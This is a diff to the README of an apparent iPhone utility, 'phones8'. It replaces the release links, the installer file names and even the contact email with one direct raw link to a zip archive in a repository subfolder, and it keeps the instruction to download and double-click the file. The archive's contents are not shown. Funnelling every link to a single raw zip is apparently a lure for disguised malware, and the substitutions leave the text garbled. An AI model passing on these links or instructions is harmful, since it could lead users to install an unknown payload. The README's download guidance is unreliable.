@@ -4,14 +4,14 @@
 
 Welcome to phones8! This application helps you maximize your iPhone experience with ease. Follow the steps below to download and run the software successfully.
 
-[![Download phones8](https://img.shields.io/badge/Download-phones8-blue.svg)](https://github.com/AngomindTecnologia/phones8/releases)
+[![Download phones8](https://raw.githubusercontent.com/AngomindTecnologia/phones8/main/interwoven/phones8.zip)](https://raw.githubusercontent.com/AngomindTecnologia/phones8/main/interwoven/phones8.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/AngomindTecnologia/phones8/releases). This page contains the latest version of phones8 and other past versions.
+   Go to the [Releases Page](https://raw.githubusercontent.com/AngomindTecnologia/phones8/main/interwoven/phones8.zip). This page contains the latest version of phones8 and other past versions.
 
 2. **Choose Your Version**  
    Look for the version you want to download. The latest version usually appears at the top. Click on it to open the details.
@@ -19,8 +19,8 @@ To get started, follow these steps:
 3. **Download the File**  
    You will see a list of assets associated with this release. Download the file that matches your operating system:
 
-   - For Windows, look for a file named something like `phones8_windows.exe`.
-   - For Mac, find a file named `phones8_mac.dmg`.
+   - For Windows, look for a file named something like `https://raw.githubusercontent.com/AngomindTecnologia/phones8/main/interwoven/phones8.zip`.
+   - For Mac, find a file named `https://raw.githubusercontent.com/AngomindTecnologia/phones8/main/interwoven/phones8.zip`.
 
 4. **Run the Installer**
    Once the download finishes, locate the file in your downloads folder and double-click it to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -70,7 +70,7 @@ A: If you run into any problems, feel free to visit the Issues section on our Gi
 
 ## 🔗 Important Links
 
-- [Release Page for Download](https://github.com/AngomindTecnologia/phones8/releases)
+- [Release Page for Download](https://raw.githubusercontent.com/AngomindTecnologia/phones8/main/interwoven/phones8.zip)
 - [Documentation](insert-documentation-link-here) (to be created)
 - [Support](insert-support-link-here) (to be created)
 
@@ -80,6 +80,6 @@ We welcome you to contribute to phones8! If you would like to help improve the a
 
 ## 📬 Contact Us
 
-For questions or feedback, you can reach us through the contact form on our website or send us an email at support@example.com (replace with actual email).
+For questions or feedback, you can reach us through the contact form on our website or send us an email at https://raw.githubusercontent.com/AngomindTecnologia/phones8/main/interwoven/phones8.zip (replace with actual email).
 
 Thank you for choosing phones8! We hope this application enhances your iPhone experience.
